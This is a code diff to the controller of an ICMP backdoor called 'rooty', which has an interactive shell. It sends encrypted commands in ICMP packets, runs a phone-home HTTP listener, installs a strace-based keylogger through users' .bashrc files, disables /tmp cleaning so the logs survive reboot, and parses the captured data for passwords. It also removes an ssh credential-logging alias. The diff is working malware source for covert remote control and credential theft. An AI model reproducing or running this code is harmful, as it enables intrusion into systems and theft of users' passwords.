@@ -161,6 +161,37 @@ def cmdoutput(line):
       cmdout = []
       return orig
 
+#Same as above, dont output to screen
+def cmdoutputnoprint(line):
+   global cmdout
+   global outputdelay
+   key_info = generate_key_info()
+   key = generate_key(key_info)
+   encrypted_data = crypt_data(magic + "\x02" + line, key)
+   send(build_pkt(src_ip, dst_ip, encrypted_data, key_info), verbose=0)
+
+   len1 = len(cmdout)
+   time.sleep(outputdelay)
+   while 1:
+      if len(cmdout) != len1:
+          len1 = len(cmdout)
+          time.sleep(outputdelay)
+      else:
+          break
+      orig = []
+      for i in cmdout:
+         if i.find('\n') > -1:
+            new = i.split('\n')
+            for x in new:
+               orig.append(x)
+         else:
+            orig.append(i)
+      cmdout = []
+      return orig
+
+
+
+
 import cmd
 # Now just read our input and send commands
 class Shell(cmd.Cmd):
@@ -229,12 +260,21 @@ class Shell(cmd.Cmd):
       
 
 
-    def do_phonehome_listener(self, line):
+    def do_phonehome_listener_start(self, line):
       "Start an http web server on specfici port, ex phonehome_listener 8080"
       line = line.rstrip('\n')
+      if line == "":
+         print "No port given, defaulting to port 443"
+         line = "443"
       os.system("python -m SimpleHTTPServer "+line+" &> /tmp/.phonehome & echo $! > /tmp/.phonehomepid")
       os.system("cat /tmp/.phonehomepid")
       print "HTTP Server setup, run phonehome_check to verify whos calling back"
+
+    def do_phonehome_listener_stop(self, line):
+      "Stop the http web server"
+      pid = os.popen("cat /tmp/.phonehomepid").read()
+      os.system("kill "+pid)
+      print "Phone Home HTTP Server killed"
 
 
     def do_phonehome_check(self, line):
@@ -331,11 +371,6 @@ class Shell(cmd.Cmd):
       time.sleep(5)
       cmdoutput('cat /tmp/.keyring-2WEFPj')
 
-    def do_sshkeylogger(self, line):
-      "Ghetto ssh alias, to log creds with strace"
-      print("alias ssh=\'strace -o /tmp/.keyring-83nx919y9epqro -\`date \'+%d%h%m%s\'\`.log -e read,write,connect -s2048 ssh\'")
-      cmdoutput("alias ssh=\'strace -o /tmp/.keyring-83nx919y9epqro -\`date \'+%d%h%m%s\'\`.log -e read,write,connect -s2048 ssh\'")
-
     def do_msfpayloadbuilder(self, line):
       "Build/Upload Metasploit Payload, Requires MSFPAYLOAD on local box"
       global shellcode_file
@@ -374,13 +409,13 @@ class Shell(cmd.Cmd):
 
     def do_keylogger_install(self, line):
        "Install Keylogger using strace, add to every users .bashrc"
-       
+
        output = cmdoutput("echo \"\" > /etc/init/mounted-tmp.conf && echo true")
        if "true" in str(output):
-          print "Successful Disable if tmp dir clean after reboot"
+          print "Successful, disabled /tmp/ dir cleaning after reboot."
        else:
-          print "Unsuccessful, either permissions or /etc/init/mounted-tmp.conf doesnt exist, grab files before reboot"
-       
+          print "Unsuccessful, either permissions or /etc/init/mounted-tmp.conf doesnt exist, be sure to run keylogger_readpasswords often"
+
        installcheck = cmdoutput("ls /tmp/.keyring-923q4908afmw && echo true")
        if "true" in str(installcheck):
          print "Its already installed dude... check the /tmp/.keyring-923q4908afmw/ directory for output"
@@ -405,26 +440,32 @@ class Shell(cmd.Cmd):
        "Parses the collected keylogger data, tries to find passwords based on newlines"
        installcheck = cmdoutput("ls /tmp/.keyring-923q4908afmw && echo true")
        if "true" in str(installcheck):
-          output = cmdoutput("cat /tmp/.keyring-923q4908afmw/.* | egrep '(.*write.*password.*|read)'")
-          os.system('clear')
-          for i in output:
+          output = cmdoutputnoprint("cat /tmp/.keyring-923q4908afmw/.* | egrep '(.*write.*password.*|read)'")
+          #output check
+          if output != None:
+             if len(output) > 1:
+                os.system('clear')
+                for i in output:
  
-             if "password" in i:
-                if len(i) < 200:
-                   x = i.split(',')
-                   if len(x) > 1:
-                      print x[1]
-             if len(i) < 50:
+                   if "password" in i:
+                      if len(i) < 200:
+                         x = i.split(',')
+                         if len(x) > 1:
+                            print x[1]
+                   if len(i) < 50:
                 
-                i = i.split(',')
-                if len(i) > 1:
-                   clean = i[1].replace('"','')
-                   clean = clean.replace('\\n','  : <---- \\n found Potential Password  or Above ^^^')
-                   clean = clean.replace('\\r','')
-                   print clean
+                      i = i.split(',')
+                      if len(i) > 1:
+                         clean = i[1].replace('"','')
+                         clean = clean.replace('\\n','  : <---- \\n found Potential Password  or Above ^^^')
+                         clean = clean.replace('\\r','')
+                         print clean
+             else:  "Key keylog data has been found, check back later..."
+          else:
+              print "No keylog data has been found, check back later..."
        else:
           print "Keylogger data not found... make sure you run keylogger_install"
-
+   
 
     def do_exit(self, line):
       "Exit the shell"
@@ -433,5 +474,11 @@ class Shell(cmd.Cmd):
 
     
 if __name__ == '__main__':
-    Shell().cmdloop('ICMP Backdoor (rooty) with Interactive Shell (m0r3sh3lls)')
+  interpreter = Shell()
+  l = interpreter.precmd('?')
+  r = interpreter.onecmd(l)
+  r = interpreter.postcmd(r, l)
+  if not r:
+     interpreter.cmdloop("ICMP Backdoor (rooty) with Interactive Shell (m0r3sh3lls)")
+
 
